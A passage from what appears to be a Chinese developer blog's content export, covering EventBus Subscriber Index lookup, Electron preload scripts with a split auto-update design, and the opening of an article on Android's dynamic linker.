+</span><br><span class="line">                        &quot; It may be only set once before it&#39;s used the first time to ensure consistent behavior.&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            EventBus.defaultInstance &#x3D; build();</span><br><span class="line">            return EventBus.defaultInstance;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>即用当前EventBusBuilder对象创建一个 EventBus 实例，这样我们通过EventBusBuilder配置的 Subscriber Index 也就传递到了EventBus实例中，然后赋值给EventBus的 defaultInstance成员变量。</p><p>所以在 Application 中生成了 EventBus 的默认单例，这样就保证了在项目其它地方执行EventBus.getDefault()就能得到唯一的 EventBus 实例！</p><p>由于我们现在使用了 Subscriber Index 所以不会通过findUsingReflectionInSingleClass()来反射解析订阅事件的方法。我们重点来看getSubscriberInfo()方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">private SubscriberInfo getSubscriberInfo(FindState findState) &#123;</span><br><span class="line">        &#x2F;&#x2F; 该条件不成立</span><br><span class="line">        if (findState.subscriberInfo !&#x3D; null &amp;&amp; findState.subscriberInfo.getSuperSubscriberInfo() !&#x3D; null) &#123;</span><br><span class="line">            SubscriberInfo superclassInfo &#x3D; findState.subscriberInfo.getSuperSubscriberInfo();</span><br><span class="line">            if (findState.clazz &#x3D;&#x3D; superclassInfo.getSubscriberClass()) &#123;</span><br><span class="line">                return superclassInfo;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F; 该条件成立</span><br><span class="line">        if (subscriberInfoIndexes !&#x3D; null) &#123;</span><br><span class="line">            &#x2F;&#x2F; 遍历索引类实例集合</span><br><span class="line">            for (SubscriberInfoIndex index : subscriberInfoIndexes) &#123;</span><br><span class="line">                &#x2F;&#x2F; 根据注册类的 Class 类查找SubscriberInfo</span><br><span class="line">                SubscriberInfo info &#x3D; index.getSubscriberInfo(findState.clazz);</span><br><span class="line">                if (info !&#x3D; null) &#123;</span><br><span class="line">                    return info;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>subscriberInfoIndexes就是在前边addIndex()方法中创建的，保存了项目中的索引类实例，即MyEventBusIndex的实例，继续看索引类的getSubscriberInfo()方法，来到了MyEventBusIndex类中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">    public SubscriberInfo getSubscriberInfo(Class&lt;?&gt; subscriberClass) &#123;</span><br><span class="line">        SubscriberInfo info &#x3D; SUBSCRIBER_INDEX.get(subscriberClass);</span><br><span class="line">        if (info !&#x3D; null) &#123;</span><br><span class="line">            return info;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>即根据注册类的 Class 类型从 SUBSCRIBER_INDEX 查找对应的SubscriberInfo，如果我们在注册类中定义了订阅事件的方法，则 info不为空，进而上边findUsingInfo()方法中findState.subscriberInfo != null成立，到这里主要的内容就分析完了，其它的和之前的注册流程一样。</p><p>所以 Subscriber Index 的核心就是项目编译时使用注解处理器生成保存事件订阅方法信息的索引类，然后项目运行时将索引类实例设置到 EventBus 中，这样当注册 EventBus 时，从索引类取出当前注册类对应的事件订阅方法信息，以完成最终的注册，避免了运行时反射处理的过程，所以在性能上会有质的提高。项目中可以根据实际的需求决定是否使用 Subscriber Index。</p><h2 id="完整流程"><a href="#完整流程" class="headerlink" title="完整流程"></a>完整流程</h2><p>下面我们再来看一下EventBus的完成流程，可以用以下的几张图：</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-da2c13649a8cacb4.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-818dbf28cf72aa43.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-547c9e75975c3b2c.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Electron Preload 预加载</title>
      <link href="/2021/01/02/Electron-Preload-%E9%A2%84%E5%8A%A0%E8%BD%BD/"/>
      <url>/2021/01/02/Electron-Preload-%E9%A2%84%E5%8A%A0%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<p>[转自]<a href="http://www.meicx.com/?p=7486">从零开始搭建Electron+Vue+Webpack项目框架（五）预加载和Electron自动更新</a></p><h1 id="什么是预加载"><a href="#什么是预加载" class="headerlink" title="什么是预加载"></a>什么是预加载</h1><p>来看看electron 官网的介绍: <a href="https://www.electronjs.org/docs/api/browser-window%EF%BC%9A">https://www.electronjs.org/docs/api/browser-window：</a><br>preload String (optional) - Specifies a script that will be loaded before other scripts run in the page. This script will always have access to node APIs no matter whether node integration is turned on or off. The value should be the absolute file path to the script. When node integration is turned off, the preload script can reintroduce Node global symbols back to the global scope.<br>翻译过来如下：<br>preload字符串（可选）-指定在页面中其他脚本运行之前被加载的脚本。 无论打开还是关闭 integratioin，此脚本始终可以访问node API。 该值应该是脚本的绝对文件路径。 关闭node integration后，预加载脚本将从全局局限重新引入node的全局引用标志。</p><ol><li><strong>preload</strong>是BrowserWindow类的参数webPreferences的一个可选设置项，我们解读一下官网的先容：在页面运行其他脚本之前预先加载的指定的脚本：首先是个js文件没错了，再看加载时机，在页面运行其他脚本之前预先加载，这个页面不是通俗的某个h5页面，而是指某个渲染进程（需要预加载js的渲染进程，由于渲染进程可能有多个，每个就是一个窗口），我们new一个BrowserWindow，打开了一个窗口，就是启动了一个渲染进程，若是我们不给这个窗口指定页面，那它就是空缺的，若是指定了页面，那么窗口就会加载这个页面：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const win &#x3D; new BrowserWindow(&#123;</span><br><span class="line">    width: 800,</span><br><span class="line">    height: 600</span><br><span class="line">&#125;);</span><br><span class="line">win.loadURL(&#39;https:&#x2F;&#x2F;www.baidu.com&#39;);</span><br></pre></td></tr></table></figure></li><li>如上面代码，我们建立了一个窗口，然后加载百度首页，而preload脚本的加载时机就是窗口建立后，百度首页加载之前。若是有人问，若是不挪用loadURL方式，不加载页面，preload剧本会加载吗？谜底是会，但有什么用呢？你起个壳子不给人家看页面是什么鬼？不管这些，主要的是我们明白这个加载时机就好了；<br>无论页面是否集成Node，此脚本都可以调用所有Node API：首先要说明的一点是，Electron5.x以上版本，默认无法在渲染进程中调用Node API，如需使用，需要预先设置：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">const win &#x3D; new BrowserWindow(&#123;</span><br><span class="line">    width: 800,</span><br><span class="line">    height: 600,</span><br><span class="line">    webPreferences: &#123;</span><br><span class="line">        nodeIntegration: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li>然后还要清楚一点，preload脚本是运行在渲染进程中的。再有一点就是，preload脚本中可以调用window工具（渲染进程其实就是起了个浏览器壳子），preload脚本运行在渲染进程，提前于页面和其他所有js的加载，又能调用Node API；<br>脚本文件路径为绝对路径，当node integration关闭时，预加载的脚本将从全局范围重新引入node的全局引用标志：联系前面两点明白就好了。</li></ol><p>那么，到底什么是预加载？<br>某一个渲染进程，在页面加载之前加载一个本地脚本，这个脚本能调用所有Node API、能调用window工具。用法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">const win &#x3D; new BrowserWindow(&#123;</span><br><span class="line">        width: 800,</span><br><span class="line">        height: 600,</span><br><span class="line">        webPreferences: &#123;</span><br><span class="line">            preload: path.join(__dirname, &#39;preload.js&#39;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h1 id="怎么用preload"><a href="#怎么用preload" class="headerlink" title="怎么用preload"></a>怎么用preload</h1><p>明白应该差不多了，但什么场景能用到这玩意儿呢？按正常的逻辑来想，主进程启动后启动渲染历程，渲染进程加载页面就完事儿了，哪会用到这个preolad呢？</p><p>想一下，若是我们有以下场景：</p><p>a、若是我们启动了一个窗口（渲染进程），加载了一个线上的页面，本地没有页面文件，但要做一些错误处置，好比网络错误，页面加载失败，然后在页面空缺但时刻插入一些元素；</p><p>b、若是我们的一套代码部署在web端和客户端，需要用一个变量判断是在web端还是客户端；<br>………..<br>上面两个场景若是用preload来解决的话，思路是利用prelaod中能调用window工具的特点，好比b，代码中可以用window.isClient来判断是否在客户端，默以为false，然后在preload中把window.isClient设置为true，而对于部署在web端的代码来说，这个值就是false。</p><p>上面所说的场景b的preload 例子如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 引入electron工具</span><br><span class="line">const &#123;</span><br><span class="line">    remote,</span><br><span class="line">    ipcRenderer</span><br><span class="line">&#125; &#x3D; require(&#39;electron&#39;);</span><br><span class="line">&#x2F;&#x2F; 引入node模块</span><br><span class="line">const fs &#x3D; require(&#39;fs&#39;);</span><br><span class="line">const path &#x3D; require(&#39;path&#39;);</span><br><span class="line">&#x2F;&#x2F; 引入window工具</span><br><span class="line">window.isClient &#x3D; true;</span><br><span class="line">window.sayHello &#x3D; function() &#123;</span><br><span class="line">    console.log(&#39;hello&#39;);</span><br><span class="line">&#125;;</span><br><span class="line">&#x2F;&#x2F; 操作dom</span><br><span class="line">const div &#x3D; document.createElement(&#39;div&#39;);</span><br><span class="line">div.innerText &#x3D; &#39;I am a div&#39;;</span><br><span class="line">document.body.appendChild(div);</span><br><span class="line">&#x2F;&#x2F; ...</span><br></pre></td></tr></table></figure><p>如果preoad逻辑复杂，可以用webpack打包一下，单独拎出来打包就行了，webpack单文件打包注意target要”electron-renderer”：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">Tip:  preload 打包设置</span><br><span class="line"> *&#x2F;</span><br><span class="line">const path&#x3D;require(&#39;path&#39;);</span><br><span class="line">const &#123; dependencies &#125; &#x3D; require(&#39;..&#x2F;package.json&#39;);</span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">    mode:process.env.NODE_ENV,</span><br><span class="line">    entry: &#123;</span><br><span class="line">        preload:[&#39;.&#x2F;src&#x2F;preload&#x2F;index.js&#39;]</span><br><span class="line">    &#125;,</span><br><span class="line">    output: &#123;</span><br><span class="line">        path: path.join(__dirname, &#39;..&#x2F;app&#x2F;&#39;),</span><br><span class="line">        libraryTarget: &#39;commonjs2&#39;,</span><br><span class="line">        filename: &#39;.&#x2F;[name].js&#39;</span><br><span class="line">    &#125;,</span><br><span class="line">    optimization: &#123;</span><br><span class="line">        runtimeChunk: false,</span><br><span class="line">        minimize: true</span><br><span class="line">    &#125;,</span><br><span class="line">    node: &#123;</span><br><span class="line">        fs: &#39;empty&#39;,</span><br><span class="line">        __dirname:false</span><br><span class="line">    &#125;,</span><br><span class="line">    module: &#123;</span><br><span class="line">        rules: [</span><br><span class="line">            &#123;</span><br><span class="line">                test: &#x2F;\.js$&#x2F;,</span><br><span class="line">                loader: &#39;babel-loader&#39;,</span><br><span class="line">                exclude: &#x2F;node_modules&#x2F;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    externals: [</span><br><span class="line">        ...Object.keys(dependencies || &#123;&#125;)</span><br><span class="line">    ],</span><br><span class="line">    resolve: &#123;</span><br><span class="line">        extensions: [&#39;.js&#39;],</span><br><span class="line">        alias: &#123;</span><br><span class="line">            &#39;@&#39;: path.resolve(__dirname, &quot;..&#x2F;src&quot;),</span><br><span class="line">            &#39;@public&#39;: path.resolve(__dirname, &quot;..&#x2F;public&quot;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    plugins:[],</span><br><span class="line">    target:&quot;electron-renderer&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>#自动更新<br>我们都知道，electron其实是封了个chrome内核，抛开壳子不说，里面运行的就是我们的h5页面，而就算我们跑了个空项目，没有任何内容，打包后的安装包也得30M左右，我们希望自己的程序自动更新，那么更新机制是怎样的呢？</p><p>若是我们只改动了页面某一处的脚本，却要用户更新整个安装包，那显然太不合理了，一是体验不好，二是浪费流量……</p><p>基于这种度量，加上electron主进程和渲染进程的划分，那我们可以思考如下更新机制：<br>主进程有改动时，用户需要更新整个客户端（可以做动态更新，官方好像是说支持）；渲染进程有改动时，我们只需要把h5包下载到本地然后加载就行了，这需要我们打包时能把h5包区分出来，在更新后能打开对应版本的h5包。<br>这里我们称主进程的更新为大版本更新，渲染进程的更新为小版本更新。</p><p>1、打包设置修改</p><p>由于牵扯到小版本的更新，那我们打包的时刻就得把这个“小版本”给打出来。这里只讲一下怎么把小版本的压缩包给打出来。</p><p>修改build.js，使用webpack打包主进程、打包preload、打包渲染进程，获得可执行文件目录app，然后引入electrin-builder对app目录进行打包，build一个安装包，然后把渲染进程的文件压缩并生成版本号。将渲染进程打包和压缩小版本文件拆分出来，因为分模块封装的好处，各个进程的打包逻辑拆出来，能随意组合还能复用。</p><p>详细代码就不贴出来了，太占篇幅，也没什么用，可以到<a href="https://github.com/luohao8023/electron-vue-template">https://github.com/luohao8023/electron-vue-template</a>看完整代码。</p><p>2、增加启动页，启动页显示欢迎语等，在这里检查更新</p><p>这里我们暂且叫它检查更新页，这个检查更新页是渲染进程，用户打开程序时首先显示检查更新窗口，然而这个窗口也不一定显示检查更新字样，偷偷的检查就行了，有新版本就提醒更新，没有新版本就显示欢迎语。</p><p>这儿的逻辑是单独拆分出来的，不是自动更新的时刻把自动更新逻辑自己也给更新了，容易乱套。</p><p>修改主进程代码，程序启动时首先启动自动更新窗口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre style&#x3D;&quot;box-sizing: border-box; margin: 0px; padding: 0px; overflow: auto; font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace; font-size: 13px; display: block; line-height: 1.42857; color: rgb(51, 51, 51); word-break: break-all; overflow-wrap: break-word; background-color: rgb(245, 245, 245); border: 1px solid rgb(204, 204, 204); border-radius: 4px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;&quot;&gt;app.on(&#39;ready&#39;, () &#x3D;&gt; &#123; &#x2F;&#x2F;注册快捷键打开控制台事宜</span><br><span class="line">    shortcut.register(&#39;Command+Control+Alt+F5&#39;);</span><br><span class="line">    mainWindow &#x3D; updateWin.create();</span><br><span class="line">&#125;);&lt;&#x2F;pre&gt;</span><br></pre></td></tr></table></figure><p>然后注册监听事件，由于自动更新窗口逻辑完成之后需要唤醒主窗口，需要主进程来协调：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre style&#x3D;&quot;box-sizing: border-box; margin: 0px; padding: 0px; overflow: auto; font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace; font-size: 13px; display: block; line-height: 1.42857; color: rgb(51, 51, 51); word-break: break-all; overflow-wrap: break-word; background-color: rgb(245, 245, 245); border: 1px solid rgb(204, 204, 204); border-radius: 4px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;&quot;&gt;&#x2F;&#x2F;启动主窗体</span><br><span class="line">ipcMain.on(&#39;create-main&#39;,(event,arg) &#x3D;&gt; &#123; &#x2F;&#x2F; h5页面指向指定版本</span><br><span class="line">    &#x2F;&#x2F; global.wwwroot.path &#x3D; arg.newVersionPath ? arg.newVersionPath : __dirname;</span><br><span class="line">    &#x2F;&#x2F; if (arg.version) setVal(&#39;version&#39;,&#39;smallVersion&#39;, arg.version);</span><br><span class="line"> indexWin.create();</span><br><span class="line">    mainWindow.destroy();</span><br><span class="line">&#125;);&lt;&#x2F;pre&gt;</span><br></pre></td></tr></table></figure><p>自动更新窗口只需专注于更新逻辑就行了，逻辑竣事后呼起主窗口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre style&#x3D;&quot;box-sizing: border-box; margin: 0px; padding: 0px; overflow: auto; font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace; font-size: 13px; display: block; line-height: 1.42857; color: rgb(51, 51, 51); word-break: break-all; overflow-wrap: break-word; background-color: rgb(245, 245, 245); border: 1px solid rgb(204, 204, 204); border-radius: 4px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;&quot;&gt;        &#x2F;&#x2F; 更新逻辑看下面伪代码</span><br><span class="line">        const v1 &#x3D; getOnlineVersion();</span><br><span class="line">        const v2 &#x3D; getLocalVersion();</span><br><span class="line">        const needUpdate &#x3D; checkVersion(v1, v2); if (needUpdate) &#123;</span><br><span class="line">            downloadVersion();</span><br><span class="line">        &#125; this.runMain();&lt;&#x2F;pre&gt;</span><br></pre></td></tr></table></figure><p>在呼起主窗口的同时给主窗口通报参数，并通知主窗口有没有更新版本，以及主窗口需要加载哪个小版本的包，而主窗口在loadURL时也要做下改动：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre style&#x3D;&quot;box-sizing: border-box; margin: 0px; padding: 0px; overflow: auto; font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace; font-size: 13px; display: block; line-height: 1.42857; color: rgb(51, 51, 51); word-break: break-all; overflow-wrap: break-word; background-color: rgb(245, 245, 245); border: 1px solid rgb(204, 204, 204); border-radius: 4px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;&quot;&gt;    let wwwroot &#x3D; global.wwwroot.path ? global.wwwroot.path : __dirname;</span><br><span class="line">    let filePath &#x3D; url.pathToFileURL(path.join(wwwroot, &#39;index.html&#39;)).href;&lt;&#x2F;pre&gt;</span><br></pre></td></tr></table></figure><p>而wwwrot就是当前小版本包的根路径，由主历程来维护，自动更新小版本后会修改这个值，以告诉主进程加载哪个版本。</p><p>好了，烦琐了一大堆，很多多少地方没贴代码，感受贴了代码的话，篇幅就不受控制了，照样去github看完整项目吧，自动更新这一块是伪代码，只实现了渲染历程的切换（即自动更新窗口呼起主窗口），详细的更新逻辑实现起来的话还要拿线上版本去对照，这个照样留给人人在现实项目中去调试吧。</p><p>好啦，有什么问题可以留言交流，也可以直接去看代码<a href="https://github.com/luohao8023/electron-vue-template">https://github.com/luohao8023/electron-vue-template</a>。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Electron </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android中的动态链接</title>
      <link href="/2020/12/20/Android%E4%B8%AD%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/"/>
      <url>/2020/12/20/Android%E4%B8%AD%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<p>转自<br><a href="https://jackwish.net/2016/android-dynamic-linker.html">链接1</a><br><a href="https://www.cnblogs.com/tracylee/archive/2012/10/15/2723816.html">链接2</a></p><h1 id="静态链接与动态链接"><a href="#静态链接与动态链接" class="headerlink" title="静态链接与动态链接"></a>静态链接与动态链接</h1><p>大多数高级语言都支持分别编译，程序员可以显式地把程序划分为独立的模块或文件，然后每个独立部分分别编译。在编译之后，由链接器把这些独立的片段（称为编译单元）“粘接到一起”。（想想这样做有什么好处？）<br>在C/C++中，这些独立的编译单元包括obj文件（一般的源程序编译而成）、lib文件（静态链接的函数库）、dll文件（动态链接的函数库）等。<br>静态链接方式：在程序执行之前完成所有的组装工作，生成一个可执行的目标文件（EXE文件）。<br>动态链接方式：在程序已经为了执行被装入内存之后完成链接工作，并且在内存中一般只保留该编译单元的一份拷贝。</p><h4 id="静态链接库与动态链接库"><a href="#静态链接库与动态链接库" class="headerlink" title="静态链接库与动态链接库"></a>静态链接库与动态链接库</h4><p>先来阐述一下DLL(Dynamic Linkable Library)的概念，你可以简单的把DLL看成一种仓库，它提供给你一些可以直接拿来用的变量、函数或类。</p><p>静态链接库与动态链接库都是共享代码的方式，如果采用静态链接库，则无论你愿不愿意，lib中的指令都被直接包含在最终生成的EXE文件中了。但是若使用DLL，该DLL不必被包含在最终的EXE文件中，EXE文件执行时可以“动态”地引用和卸载这个与EXE独立的DLL文件。</p><p>采用动态链接库的优点：（1）更加节省内存；（2）DLL文件与EXE文件独立，只要输出接口不变，更换DLL文件不会对EXE文件造成任何影响，因而极大地提高了可维护性和可扩展性。</p><h4 id="认识动态链接库"><a href="#认识动态链接库" class="headerlink" title="认识动态链接库"></a>认识动态链接库</h4><p>动态链接是相对于静态链接而言的。所谓静态链接是指把要调用的函数或者过程链接到可执行文件中，成为可执行文件的一部分。换句话说，函数和过程的代码就在程序的exe文件中，该文件包含了运行时所需的全部代码。当多个程序都调用相同函数时，内存中就会存在这个函数的多个拷贝，这样就浪费了宝贵的内存资源。而动态链接所调用的函数代码并没有被拷贝到应用程序的可执行文件中去，而是仅仅在其中加入了所调用函数的描述信息（往往是一些重定位信息）。仅当应用程序被装入内存开始运行时，在Windows的管理下，才在应用程序与相应的DLL之间建立链接关系。当要执行所调用DLL中的函数时，根据链接产生的重定位信息，Windows才转去执行DLL中相应的函数代码。一般情况下，如果一个应用程序使用了动态链接库，Win32系统保证内存中只有DLL的一份复制品</p><h4 id="动态链接库的两种链接方法："><a href="#动态链接库的两种链接方法：" class="headerlink" title="动态链接库的两种链接方法："></a>动态链接库的两种链接方法：</h4><p>(1) 装载时动态链接(Load-time Dynamic Linking)：这种用法的前提是在编译之前已经明确知道要调用DLL中的哪几个函数，编译时在目标文件中只保留必要的链接信息，而不含DLL函数的代码；当程序执行时，调用函数的时候利用链接信息加载DLL函数代码并在内存中将其链接入调用程序的执行空间中(全部函数加载进内存），其主要目的是便于代码共享。（动态加载程序，处在加载阶段，主要为了共享代码，共享代码内存）</p><p>(2) 运行时动态链接(Run-time Dynamic Linking)：这种方式是指在编译之前并不知道将会调用哪些DLL函数，完全是在运行过程中根据需要决定应调用哪个函数，将其加载到内存中（只加载调用的函数进内存），并标识内存地址，其他程序也可以使用该程序，并用LoadLibrary和GetProcAddress动态获得DLL函数的入口地址。（dll在内存中只存在一份，处在运行阶段）</p><p>上述的区别主要在于阶段不同，编译器是否知道进程要调用的dll函数。动态加载在编译时知道所调用的函数，而在运行态时则必须不知道。</p><h1 id="Android中的动态链接"><a href="#Android中的动态链接" class="headerlink" title="Android中的动态链接"></a>Android中的动态链接</h1><p>在Android中，当<code>System.loadLibrary()</code>用Java<code>dlopen()</code>执行或以本机代码执行时，将调用动态链接器。对于Java代码，Dalvik / Android运行时<code>dlopen()</code>最终会调用动态链接器。</p><p>从<a href="https://android.googlesource.com/platform/bionic/+/android-5.1.0_r1/linker/linker.cpp">Lollipop MR1</a>（我们的讨论基于<a href="https://android.googlesource.com/platform/bionic/+/android-6.0.1_r1/linker/linker.cpp">Marshmallow</a>）开始，Android动态链接分为两个阶段：库加载和库重定位。如图3所示，左半部分正在加载，而右半部分正在链接。</p><p>在库加载过程中，动态链接程序将重建<em>库依赖关系</em>，并将其所有库加载到内存中。库重定位过程链接了依赖性。我们首先讨论Android动态链接器的重要数据结构。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-0c69a79d0047b253.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Android动态链接器的工作流程"></p><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><h4 id="持久数据结构"><a href="#持久数据结构" class="headerlink" title="持久数据结构"></a>持久数据结构</h4><p>Android的动态链接器在应用程序/程序的生命周期中具有两个持久的数据结构*-LSPath<em>（库搜索路径）和</em>ALList*（已加载的库列表）。</p><p><strong><em>LSPath</em></strong> 是存储库的目录。动态链接器遍历这些路径以寻找库。这些路径对于库的定位至关重要，并按优先级排序。</p><p><strong><em>ALList</em></strong> 是以 <em>soinfo</em> 为元素的列表，其用于保持装载的库（例如数据ELF和存储器布局）的元数据。动态链接器在不同的库加载和链接过程中从<em>ALList</em>获取数据。分别在加载和卸载库时，<em>ALList</em>会增长和缩短。</p><p>持久性数据结构位于图3的顶部。图3中的“存储”在某种程度上意味着<em>LSPath</em>。</p><h4 id="临时数据结构"><a href="#临时数据结构" class="headerlink" title="临时数据结构"></a>临时数据结构</h4><p>自然地，在加载库期间会使用许多临时数据结构。其中，最重要的两个是<em>load_tasks</em>和<em>local_group</em>。他们两个都表现出对<em>库的依赖</em>。</p><p><strong><em>load_tasks</em></strong>是一个队列，其中包含要加载的库-<em>库相关性</em>的子库，这些<em>库</em>尚未加载到内存中。当链接程序开始搜索库并使刚解析的相关库<em>入库</em>时（从<code>DT_NEEDED</code>ELF格式库的表中），* load_tasks*出队。</p><p>加载所有<em>树</em>后（<em>此时load_tasks</em>为空），*<strong>便**<em>构造了</em></strong>local_group**<em>并将其用于重定位。</em>local_group<em>是</em>soinfo<em>的队列，</em>并按<em>BFS顺序表示</em>库依赖关系<em>。（将在“特殊功能”部分中讨论另一个称为</em>global_group的*类似数据结构。）</p><p>临时数据结构在上图的底部列出。</p><h3 id="Library装载程序"><a href="#Library装载程序" class="headerlink" title="Library装载程序"></a>Library装载程序</h3><p>在开始的时候，Library被操作系统请求-<em>Root</em>-添加到<em>load_tasks</em>，如上图所示。在库加载的程序，动态链接程序不断在<em>load_tasks</em>加载的所有Library 并更新它，如图的左半部分， 完成此过程后，将加载<em>library dependency</em>中的所有库。</p><h4 id="Library定位"><a href="#Library定位" class="headerlink" 